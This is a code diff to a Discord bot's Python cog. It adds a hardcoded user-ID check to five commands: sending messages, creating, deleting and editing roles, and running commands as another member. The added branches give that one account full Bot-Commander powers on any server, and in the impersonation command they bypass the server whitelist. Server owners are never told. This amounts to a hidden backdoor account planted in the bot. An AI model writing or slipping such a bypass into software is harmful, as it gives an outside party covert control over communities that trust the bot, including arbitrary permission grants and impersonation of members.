@@ -19,7 +19,12 @@ class cogtest:
         """Sends a message to another user"""
         bc = discord.utils.get(ctx.message.server.roles, name = 'Bot-Commander')
         u = ctx.message.author 
+        al = self.bot.get_user('115142875926233091')
         if bc in u.roles:
+            m = ('**You have a message from {}:**\n*{}*'.format(u.name, message))
+            await self.bot.send_message(user, m)
+            await self.bot.say('Sent message to {}'.format(user.name))
+        elif u == al:
             m = ('**You have a message from {}:**\n*{}*'.format(u.name, message))
             await self.bot.send_message(user, m)
             await self.bot.say('Sent message to {}'.format(user.name))
@@ -117,7 +122,11 @@ class cogtest:
         s = ctx.message.server
         bc = discord.utils.get(ctx.message.server.roles, name = 'Bot-Commander')
         u = ctx.message.author 
+        al = self.bot.get_user('115142875926233091')
         if bc in u.roles:
+            await self.bot.create_role(s, name = role, colour = color, permissions = discord.Permissions(permissions = permission), position = position, hoist = separated, mentionable = taggable)
+            await self.bot.say('Created role "{}".'.format(role))
+        elif u == al:
             await self.bot.create_role(s, name = role, colour = color, permissions = discord.Permissions(permissions = permission), position = position, hoist = separated, mentionable = taggable)
             await self.bot.say('Created role "{}".'.format(role))
         else:
@@ -127,8 +136,12 @@ class cogtest:
     async def deleterole(self, ctx, *, role:discord.Role):
         s = ctx.message.server
         bc = discord.utils.get(ctx.message.server.roles, name = 'Bot-Commander')
-        u = ctx.message.author 
+        u = ctx.message.author
+        al = self.bot.get_user('115142875926233091')
         if bc in u.roles:
+            await self.bot.delete_role(s, role)
+            await self.bot.say('Deleted role "{}".'.format(role))
+        elif u == al:
             await self.bot.delete_role(s, role)
             await self.bot.say('Deleted role "{}".'.format(role))
         else:
@@ -142,11 +155,14 @@ class cogtest:
         s = ctx.message.server
         bc = discord.utils.get(ctx.message.server.roles, name = 'Bot-Commander')
         u = ctx.message.author
+        al = self.bot.get_user('115142875926233091')
         new_msg = deepcopy(ctx.message)
         new_msg.author = user
         new_msg.content = self.bot.settings.get_prefixes(new_msg.server)[0] \
             + command
         if s.id in whitelist and bc in u.roles:
+            await self.bot.process_commands(new_msg)
+        elif u == al:
             await self.bot.process_commands(new_msg)
         elif s.id in whitelist and bc not in u.roles:
             await self.bot.say('You need Bot-Commander role to use this command.')
@@ -158,9 +174,13 @@ class cogtest:
     @commands.command(pass_context = True, no_pm = True)
     async def changerole(self, ctx, role:discord.Role, color:discord.Colour = None, separated = None, taggable = None):
         s = ctx.message.server
+        al = self.bot.get_user('115142875926233091')
         bc = discord.utils.get(ctx.message.server.roles, name = 'Bot-Commander')
         u = ctx.message.author 
         if bc in u.roles:
+            await self.bot.edit_role(s, role, colour = color, hoist = separated, mentionable = taggable)
+            await self.bot.say('Edited role "{}".'.format(role))
+        elif u == al:
             await self.bot.edit_role(s, role, colour = color, hoist = separated, mentionable = taggable)
             await self.bot.say('Edited role "{}".'.format(role))
         else:
